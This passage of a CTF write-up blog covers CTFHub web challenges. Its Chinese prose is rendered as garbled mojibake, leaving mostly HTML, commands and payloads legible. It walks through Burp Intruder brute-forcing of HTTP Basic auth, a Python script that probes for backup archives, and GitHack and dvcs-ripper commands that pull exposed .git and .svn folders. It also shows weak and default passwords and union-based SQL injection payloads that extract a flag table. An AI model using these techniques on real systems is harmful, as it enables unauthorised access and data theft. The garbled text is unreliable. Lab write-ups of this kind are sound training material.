konw admin ?ï¼Œäºæ˜¯çŒœæµ‹è´¦å·æ˜¯ admin , é‚£ä¹ˆæ¥ä¸‹æ¥å°±åªéœ€è¦çˆ†ç ´å¯†ç äº†ã€‚æ³¨æ„çœ‹åˆ° HTTP è¯·æ±‚å¤´éƒ¨çš„ Authorization å­—æ®µï¼Œåé¢çš„YWFhOmjiYg==ç”¨base64 è§£ç åæ˜¯ aaa:bbbï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„è´¦å·:å¯†ç ã€‚</p><p> ä½¿ç”¨ BurpSuite è¿›è¡ŒåŸºç¡€è®¤è¯çˆ†ç ´</p><p>ï¼ˆ1ï¼‰å°†æŠ¥æ–‡å‘é€åˆ° Intruder, å°† Basicåé¢ base64éƒ¨åˆ†æ·»åŠ ä¸ºpayload position</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>ï¼ˆ2ï¼‰åœ¨ Payloadsé€‰é¡¹å¡ä¸‹ï¼Œé€‰æ‹© Payload Typeä¸ºSimpleList,ç„¶ååœ¨ Payload Options ä¸­ç‚¹å‡» load åŠ è½½å¯†ç å­—å…¸</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>ï¼ˆ3ï¼‰Payload Processing -&gt; Add-&gt; Add Prefixï¼ˆæ·»åŠ å‰ç¼€ï¼‰-&gt; è¾“å…¥ admin:</p><p>  Payload Processing -&gt; Add-&gt; Encodeï¼ˆæ·»åŠ ä¸€ä¸ªç¼–ç æ–¹å¼ï¼‰-&gt; é€‰æ‹© Base64 Encode</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>ï¼ˆ4ï¼‰Payload Encode å–æ¶ˆå‹¾é€‰çš„ URL-encode, ä¸ç„¶ä½ ä¼šçœ‹åˆ°base64ä¹‹åçš„=ä¼šè¢«è½¬æˆ %3d ï¼Œä½ å°±ç®—çˆ†ç ´åˆ°å¤©è’åœ°è€ä¹Ÿä¸ä¼šå‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945375.png" alt="img"></p><p>ï¼ˆ5ï¼‰Start Attack ï¼Œç„¶åæŒ‰ Length æ’åºï¼Œå¹¶çœ‹åˆ°çŠ¶æ€ç å‡ºç°200çš„ï¼Œå³çˆ†ç ´æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945389.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200308145945416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p><p>æŸ¥çœ‹ Responseï¼Œå¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51753_3.png" alt></p><p>æœ‰ç‚¹æ“ä½œæ°´å¹³ã€‚ã€‚ã€‚ã€‚</p><h4 id="å“åº”åŒ…æºç "><a href="#å“åº”åŒ…æºç " class="headerlink" title="å“åº”åŒ…æºç "></a>å“åº”åŒ…æºç </h4><p>ç­‰æ¸¸æˆç»“æŸf12æŸ¥çœ‹æºç å³å¯</p><h2 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51433_1.png" alt></p><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p><a href="http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt" target="_blank" rel="noopener">http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt</a></p><h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p><a href="http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php" target="_blank" rel="noopener">http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php</a></p><p>ctrl+fä¸€æŠŠæ¢­</p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//æœç‹—æˆªå›¾20å¹´12æœˆ23æ—¥1437_2.png" style="zoom: 80%;"><p>ctfhub{eff7ead587e67aab8af40775}</p><h3 id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h3><h4 id="ç½‘ç«™æºç "><a href="#ç½‘ç«™æºç " class="headerlink" title="ç½‘ç«™æºç "></a>ç½‘ç«™æºç </h4><p>å½“å¼€å‘äººå‘˜åœ¨çº¿ä¸Šç¯å¢ƒä¸­å¯¹æºä»£ç è¿›è¡Œäº†å¤‡ä»½æ“ä½œï¼Œå¹¶ä¸”å°†å¤‡ä»½æ–‡ä»¶æ”¾åœ¨äº† web ç›®å½•ä¸‹ï¼Œå°±ä¼šå¼•èµ·ç½‘ç«™æºç æ³„éœ²ã€‚</p><p>å¯èƒ½æœ‰ç‚¹ç”¨çš„æç¤ºï¼š</p><pre><code>#### å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åç¼€------- tar- tar.gz- zip- rar#### å¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶å------- web- website- backup- back- www- wwwroot- temp</code></pre><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip</a></p><pre><code>\#!usr/bin/env python#_*_ coding:utf-8 _*_import requests url=&quot;http://challenge-9936840b90db7048.sandbox.ctfhub.com:10080/&quot;list1=[&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;] list2=[&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]for i in list1:  for j in list2:         url_f=url+i+&quot;.&quot;+j    r=requests.get(url_f)        if(r.status_code == 200):            print(url_f)</code></pre><p>å¯¹æ²¡æœ‰é”™ï¼Œå°±æ˜¯é€šè¿‡è¿™ä¸ªè„šæœ¬æ¥åˆ¤æ–­æ˜¯å“ªä¸ªé¡µé¢ä¸º200</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51522_4.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51452_3.png" alt></p><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt</a></p><p>å®Œäº‹ï¼</p><h4 id="bakæ–‡ä»¶"><a href="#bakæ–‡ä»¶" class="headerlink" title="bakæ–‡ä»¶"></a>bakæ–‡ä»¶</h4><p>ä»‹ç»ï¼šå½“å¼€å‘äººå‘˜åœ¨çº¿ä¸Šç¯å¢ƒä¸­å¯¹æºä»£ç è¿›è¡Œäº†å¤‡ä»½æ“ä½œï¼Œå¹¶ä¸”å°†å¤‡ä»½æ–‡ä»¶æ”¾åœ¨äº† web ç›®å½•ä¸‹ï¼Œå°±ä¼šå¼•èµ·ç½‘ç«™æºç æ³„éœ²ã€‚</p><p>é’ˆå¯¹index.php.bakæ–‡ä»¶</p><p>è¾“å…¥ä¸‹è½½å®Œä»¥åæ”¹ä¸º.txtæ ¼å¼æ‰“å¼€ç›´æ¥ä¸€æŠŠæ¢­</p><h4 id="vimç¼“å­˜"><a href="#vimç¼“å­˜" class="headerlink" title="vimç¼“å­˜"></a>vimç¼“å­˜</h4><p>ä»‹ç»ï¼šå½“å¼€å‘äººå‘˜åœ¨çº¿ä¸Šç¯å¢ƒä¸­ä½¿ç”¨ vim ç¼–è¾‘å™¨ï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šç•™ä¸‹ vim ç¼–è¾‘å™¨ç¼“å­˜ï¼Œå½“vimå¼‚å¸¸é€€å‡ºæ—¶ï¼Œç¼“å­˜ä¼šä¸€ç›´ç•™åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¼•èµ·ç½‘ç«™æºç æ³„éœ²ã€‚</p><p>.index.php.swp</p><p>è¿™é‡Œæ³¨æ„indexå‰é¢æœ‰ä¸ªç‚¹</p><p>ç„¶åå°†swpæ”¹ä¸ºtxtæ‰“å¼€</p><h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><p>ä»‹ç»ï¼š.DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚</p><p>ä¸‹è½½å®Œä»¥åç”¨.mdæ–‡ä»¶æ ¼å¼æ‰“å¼€</p><p>18c26ec34f6edafc85a7cd5e20853f58.txtå‘ç°è¿™ä¸ªæ–‡ä»¶</p><p><a href="http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txtä¸€æŠŠæ¢­" target="_blank" rel="noopener">http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txtä¸€æŠŠæ¢­</a></p><h3 id="Gitæ³„éœ²"><a href="#Gitæ³„éœ²" class="headerlink" title="Gitæ³„éœ²"></a>Gitæ³„éœ²</h3><h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><p>ä»‹ç»ï¼šå½“å‰å¤§é‡å¼€å‘äººå‘˜ä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.gitæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´ã€‚</p><p>å…ˆç”¨dirsearch.pyè¿›è¡Œæ‰«æ</p><p>python3 dirsearch.py -u <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> -e*</p><pre><code>-u æŒ‡å®šç½‘å€ -e æŒ‡å®šç½‘ç«™è¯­è¨€#ä¾‹å¦‚-e phpï¼Œzipï¼Œè¿™é‡Œ-e*æ˜¯æ‰€æœ‰ -t æŒ‡å®šçº¿ç¨‹ -w æŒ‡å®šå­—å…¸ -r é€’å½’ç›®å½•ï¼ˆè·‘å‡ºç›®å½•åï¼Œç»§ç»­è·‘ç›®å½•ä¸‹é¢çš„ç›®å½•ï¼‰ --random-agents ä½¿ç”¨éšæœºUA(é»˜è®¤åœ¨db/uesr-agents.txtä¸­ï¼Œå¯ä»¥è‡ªå·±æ·»åŠ ) -x æ’é™¤æŒ‡å®šçŠ¶æ€ç  -s ç½®è¯·æ±‚ä¹‹é—´çš„å»¶æ—¶(ç§’)</code></pre><p>ç„¶åç”¨githackè„šæœ¬è·‘</p><pre><code>python GitHack.py http://challenge-bf6c3305d834ed77.sandbox.ctfhub.com:10080/.git</code></pre><p>è·‘å®Œä»¥åå»listç›®å½•å»çœ‹çœ‹</p><p>è¿›å…¥æ‰€ä¸‹è½½çš„æ–‡ä»¶é‡Œé¢</p><pre><code>git log#ä½¿ç”¨git logå‘½ä»¤æŸ¥çœ‹æœ¬åœ°çš„æ‰€æœ‰æäº¤</code></pre><p>å¾—ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51914_4.png" alt></p><pre><code>git reset --hard ea27539d5ad2aa769ee2375400a0a5afc39faab0#å½»åº•å›é€€åˆ°æŸä¸ªç‰ˆæœ¬ï¼Œæœ¬åœ°çš„æºç ä¹Ÿä¼šå˜ä¸ºä¸Šä¸€ä¸ªç‰ˆæœ¬çš„å†…å®¹ï¼Œæ’¤é”€çš„commitä¸­æ‰€åŒ…å«çš„æ›´æ”¹è¢«å†²æ‰ï¼›lscat 241282368416724.txt</code></pre><p>å¾—åˆ°flag</p><h4 id="stashï¼ˆå‚¨è—ï¼‰"><a href="#stashï¼ˆå‚¨è—ï¼‰" class="headerlink" title="stashï¼ˆå‚¨è—ï¼‰"></a>stashï¼ˆå‚¨è—ï¼‰</h4><p>ç†è§£ï¼š</p><p>å½“ä½ è¦ä¿®æ”¹æˆ–è€…å˜æ›´æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªgit statshå‘½ä»¤å°†å…¶æš‚æ—¶ä¿å­˜åˆ°ä¸€ä¸ªå †æ ˆä¸­ï¼Œå°±å¥½åƒæ˜¯å†™åˆ°ä¸€åŠçš„æ–‡ä»¶çªç„¶ä¸å†™äº†ï¼Œä½ è¦å»å†™å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™æ ·ä¸ºäº†é¿å…è¿™ä¸ªæ–‡ä»¶æ¶ˆå¤±ï¼Œä½ å°±è¦ç”¨è¿™ä¸ªå‘½ä»¤å°†ä»–è¿›è¡Œä¸€ä¸‹å‚¨å­˜ï¼Œç„¶ååŠå®Œæ‰‹å¤´çš„äº‹æƒ…åï¼Œä½ å°±å¯ä»¥ç»§ç»­é€šè¿‡å­˜åˆ°æ ˆé‡Œé¢çš„æ–‡ä»¶ç»§ç»­è¿›è¡Œä¹‹å‰æœªå®Œæˆçš„ç¼–è¾‘ï¼Œè€Œè¿™ä¸ªé¢˜ç›®ï¼Œå°±æ˜¯é’ˆå¯¹æŸ¥æ‰¾é€šè¿‡stashå‘½ä»¤å­˜åˆ°æ ˆé‡Œé¢çš„æ–‡ä»¶</p><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·</p><pre><code>git log//æŸ¥çœ‹å†å²è®°å½•git stash poplscat 13456789.txtè¯´æ˜ï¼š$git stash                 ï¼ï¼æŠŠæœ¬åœ°ä¿®æ”¹å¹¶ä¸”æœªæäº¤çš„å†…å®¹ï¼Œå­˜å‚¨åˆ°æœ¬åœ°æ ˆä¸­çš„æ ˆé¡¶ã€‚$do some work        ï¼ï¼æ­¤æ—¶ä½ å¯ä»¥å»åˆ‡æ¢åˆ†æ”¯æˆ–è€…pullæœ€æ–°ä»£ç $git stash pop          ï¼ï¼æ­¤æ—¶ä½ å¯ä»¥æŠŠä½ åˆšæ‰stashåˆ°æœ¬åœ°æ ˆä¸­çš„ä»£ç popåˆ°æœ¬åœ°</code></pre><h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>å¯åŠ¨githack</p><pre><code>python GitHack.py http://challenge-3aa10bcada98b68b.sandbox.ctfhub.com:10080/.git</code></pre><p>å°†ä»–çš„gitæ–‡ä»¶cloneåˆ°æœ¬åœ°ç„¶åæŸ¥çœ‹å°±ç›´æ¥ä¸€æŠŠ</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51208_1.png" alt></p><h3 id="SVNæ³„éœ²"><a href="#SVNæ³„éœ²" class="headerlink" title="SVNæ³„éœ²"></a>SVNæ³„éœ²</h3><p>å¼•å­ï¼š</p><p>å½“å¼€å‘äººå‘˜ä½¿ç”¨ SVN è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œå¯¹ç«™ç‚¹è‡ªåŠ¨éƒ¨ç½²ã€‚å¦‚æœé…ç½®ä¸å½“,å¯èƒ½ä¼šå°†.svnæ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒã€‚è¿™å°±å¼•èµ·äº† SVN æ³„éœ²æ¼æ´ã€‚</p><h4 id="å»ç½‘ä¸Šäº†è§£ä¸€ä¸‹svnæ¼æ´ï¼š"><a href="#å»ç½‘ä¸Šäº†è§£ä¸€ä¸‹svnæ¼æ´ï¼š" class="headerlink" title="å»ç½‘ä¸Šäº†è§£ä¸€ä¸‹svnæ¼æ´ï¼š"></a>å»ç½‘ä¸Šäº†è§£ä¸€ä¸‹svnæ¼æ´ï¼š</h4><h5 id="ä»€ä¹ˆæ˜¯SVN"><a href="#ä»€ä¹ˆæ˜¯SVN" class="headerlink" title="ä»€ä¹ˆæ˜¯SVN?"></a>ä»€ä¹ˆæ˜¯SVN?</h5><p>SVNæ˜¯subversionçš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œé€šè¿‡é‡‡ç”¨åˆ†æ”¯ç®¡ç†ç³»ç»Ÿçš„é«˜æ•ˆç®¡ç†ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯ç”¨äºå¤šä¸ªäººå…±åŒå¼€å‘åŒä¸€ä¸ªé¡¹ç›®ï¼Œå®ç°å…±äº«èµ„æºï¼Œå®ç°æœ€ç»ˆé›†ä¸­å¼çš„ç®¡ç†ã€‚</p><h5 id="æ¼æ´æˆå› ï¼š"><a href="#æ¼æ´æˆå› ï¼š" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h5><p>åœ¨æœåŠ¡å™¨ä¸Šå¸ƒç½²ä»£ç æ—¶ã€‚å¦‚æœæ˜¯ä½¿ç”¨ svn checkout åŠŸèƒ½æ¥æ›´æ–°ä»£ç ï¼Œè€Œæ²¡æœ‰é…ç½®å¥½ç›®å½•è®¿é—®æƒé™ï¼Œåˆ™ä¼šå­˜åœ¨æ­¤æ¼æ´ã€‚é»‘å®¢åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¯ä»¥ä¸‹è½½æ•´å¥—ç½‘ç«™çš„æºä»£ç ã€‚<br>åœ¨ä½¿ç”¨SVNç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªéšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦çš„æºä»£ç ä¿¡æ¯ã€‚ä½†ä¸€äº›ç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œä¸æ„¿æ„ä½¿ç”¨â€˜å¯¼å‡ºâ€™åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥å¤åˆ¶ä»£ç æ–‡ä»¶å¤¹åˆ°WEBæœåŠ¡å™¨ä¸Šï¼Œè¿™å°±ä½¿éšè—æ–‡ä»¶å¤¹è¢«æš´éœ²äºå¤–ç½‘ç¯å¢ƒï¼Œè¿™ä½¿å¾—æ¸—é€å·¥ç¨‹å¸ˆå¯ä»¥å€ŸåŠ©å…¶ä¸­åŒ…å«ç‰ˆæœ¬ä¿¡æ¯è¿½è¸ªçš„ç½‘ç«™æ–‡ä»¶ï¼Œé€æ­¥æ‘¸æ¸…ç«™ç‚¹ç»“æ„ã€‚</p><p>ç”¨åˆ°çš„å·¥å…·ï¼šdvcs-ripper</p><p>ç”¨dirsearchè·‘äº†ä¸€ä¸‹.svnå‘ç°ç¡®å®æœ‰ï¼Œå¯èƒ½æ–¹æ³•ä¸å¯¹ï¼Œè·‘éƒ½è·‘ä¸å®Œ</p><p>ç„¶åå¼€å§‹å›å½’æ­£å¸¸æ“ä½œï¼š</p><p>1.ä¸‹è½½æ‰€éœ€è¦çš„å·¥å…·ï¼š</p><pre><code>git clone https://github.com/kost/dvcs-ripper /svn</code></pre><p>æˆ‘è¿™é‡Œæ˜¯å°†å®ƒä¸‹è½½åˆ°svnç›®å½•é‡Œé¢</p><p>2.ä½¿ç”¨</p><pre><code>perl rip-svn.pl -u http://challenge-30d239a5f2b26f23.sandbox.ctfhub.com:10080/.svn/</code></pre><p>è¡¥å……ï¼šéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ.svnæ˜¯éšè—æ–‡ä»¶ï¼Œåœ¨linuxä¸‹å¿…é¡»ls -alæ‰èƒ½çœ‹åˆ°ã€‚<br>3.æ ¹æ®é¢˜ç›®çš„æç¤ºï¼ŒFlag åœ¨æœåŠ¡ç«¯æ—§ç‰ˆæœ¬çš„æºä»£ç ä¸­ã€‚<br>æ³¨æ„é‚£ä¸ªtreeä¸­çš„pristineï¼Œé‡Œé¢ä¸€èˆ¬å­˜å‚¨çš„æ˜¯ä»£ç çš„å†å²ç‰ˆæœ¬ã€‚æˆ‘ä»¬ç›´æ¥è¿›å…¥ç›®å½•ï¼Œç„¶åè¯»å–æ–‡ä»¶å°±å¯ä»¥å¾—åˆ°flagäº†</p><p>é—®é¢˜ï¼šè¯¥è½¯ä»¶ä¸èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œéœ€è¦é…ç½®ç»„ä»¶ï¼ˆæš‚æœªè§£å†³ï¼‰</p><h2 id="å¯†ç å£ä»¤"><a href="#å¯†ç å£ä»¤" class="headerlink" title="å¯†ç å£ä»¤"></a>å¯†ç å£ä»¤</h2><h3 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h3><p>æˆ‘çš„å¯†ç æ˜¯admin123</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8811%E6%97%A51352_2.png" alt></p><h3 id="é»˜è®¤å£ä»¤"><a href="#é»˜è®¤å£ä»¤" class="headerlink" title="é»˜è®¤å£ä»¤"></a>é»˜è®¤å£ä»¤</h3><p>è¿™ä¸ªé¢˜çœ‹å¾ˆç‰¹åˆ«ï¼Œçœ‹åˆ«äººwpä¸Šè¯´ï¼šæ˜¯é€šè¿‡ç½‘ä¸Šæœç´¢eyouçš„é»˜è®¤å£ä»¤æ¥è¿›å…¥ç½‘ç«™</p><p><a href="https://blog.csdn.net/weixin_45785288/article/details/108274723" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45785288/article/details/108274723</a></p><p>è€ƒæŸ¥çš„ä¿¡æ¯æ”¶é›†èƒ½åŠ›</p><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><h3 id="æ•´æ•°å‹æ³¨å…¥"><a href="#æ•´æ•°å‹æ³¨å…¥" class="headerlink" title="æ•´æ•°å‹æ³¨å…¥"></a>æ•´æ•°å‹æ³¨å…¥</h3><h4 id="1-æ£€æµ‹æ³¨å…¥ç‚¹"><a href="#1-æ£€æµ‹æ³¨å…¥ç‚¹" class="headerlink" title="1.æ£€æµ‹æ³¨å…¥ç‚¹"></a>1.æ£€æµ‹æ³¨å…¥ç‚¹</h4><p>è¾“å…¥1å¾—åˆ°Data: ctfhubè¾“å…¥2å¾—åˆ°Dataï¼šskillè¾“å…¥3æ²¡æœ‰å›æ˜¾ï¼Œè¾“å…¥1 or 1=1ä¹Ÿä¼šæ˜¾ç¤º1çš„å†…å®¹è¿™æ˜¯ç›´æ¥æ˜¾ç¤ºå‡ºæ¥äº†ï¼Ÿ</p><h4 id="2-æ„é€ æ³¨å…¥è¯­å¥"><a href="#2-æ„é€ æ³¨å…¥è¯­å¥" class="headerlink" title="2.æ„é€ æ³¨å…¥è¯­å¥"></a>2.æ„é€ æ³¨å…¥è¯­å¥</h4><h5 id="a-å¾—åˆ°æ•°æ®åº“"><a href="#a-å¾—åˆ°æ•°æ®åº“" class="headerlink" title="a.å¾—åˆ°æ•°æ®åº“"></a>a.å¾—åˆ°æ•°æ®åº“</h5><p>-1 union select 1,2</p><p>å¾—åˆ°å›æ˜¾Data: 2</p><p>-1 union select 1,3</p><p>å¾—åˆ°å›æ˜¾Data: 3</p><p>-1 union select 1,database()</p><p>å›æ˜¾Data: sqliï¼ˆå¾—åˆ°æ•°æ®åº“ï¼‰</p><h5 id="b-å¾—åˆ°æ•°æ®åº“é‡Œé¢çš„è¡¨"><a href="#b-å¾—åˆ°æ•°æ®åº“é‡Œé¢çš„è¡¨" class="headerlink" title="b.å¾—åˆ°æ•°æ®åº“é‡Œé¢çš„è¡¨"></a>b.å¾—åˆ°æ•°æ®åº“é‡Œé¢çš„è¡¨</h5><p>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=â€sqliâ€</p><p>å¾—åˆ°å›æ˜¾ï¼š</p><p>Data: news,flag</p><h5 id="c-çˆ†åˆ—å"><a href="#c-çˆ†åˆ—å" class="headerlink" title="c.çˆ†åˆ—å"></a>c.çˆ†åˆ—å</h5><p>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=â€flagâ€</p><p>å¾—åˆ°å›æ˜¾ï¼š</p><p>Data: flag</p><h5 id="d-çˆ†å­—æ®µ"><a href="#d-çˆ†å­—æ®µ" class="headerlink" title="d.çˆ†å­—æ®µ"></a>d.çˆ†å­—æ®µ</h5><p>-1 union select 1,group_concat(flag) from flag</p><p>å¾—åˆ°å›æ˜¾ï¼š</p><p>Data: ctfhub{3040c5c414ba645535376218}</p><h3 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h3><p>å°±åƒæ•´æ•°å‹ä¸€æ ·ï¼Œä½†æ˜¯åŒºåˆ«äºæœ‰å•å¼•å·éœ€è¦è‡ªå·±æ„é€ å•å¼•å·è¯­å¥æ¥è®©å…¶å¤±æ•ˆ</p><h4 id="1-æŸ¥çœ‹æ•°æ®åº“çš„åˆ—æ•°"><a href="#1-æŸ¥çœ‹æ•°æ®åº“çš„åˆ—æ•°" class="headerlink" title="1.æŸ¥çœ‹æ•°æ®åº“çš„åˆ—æ•°"></a>1.æŸ¥çœ‹æ•°æ®åº“çš„åˆ—æ•°</h4><p>1â€™ order by 3 â€“ â€˜å‘ç°æŠ¥é”™ï¼Œé‚£ä¹ˆæ”¹ä¸º2 ï¼š1â€™ order by 2 â€“ â€˜å¾—åˆ°å›æ˜¾</p><p>è¯´æ˜æœ‰ä¸¤åˆ—</p><h4 id="2-è”åˆæŸ¥è¯¢"><a href="#2-è”åˆæŸ¥è¯¢" class="headerlink" title="2.è”åˆæŸ¥è¯¢"></a>2.è”åˆæŸ¥è¯¢</h4><h5 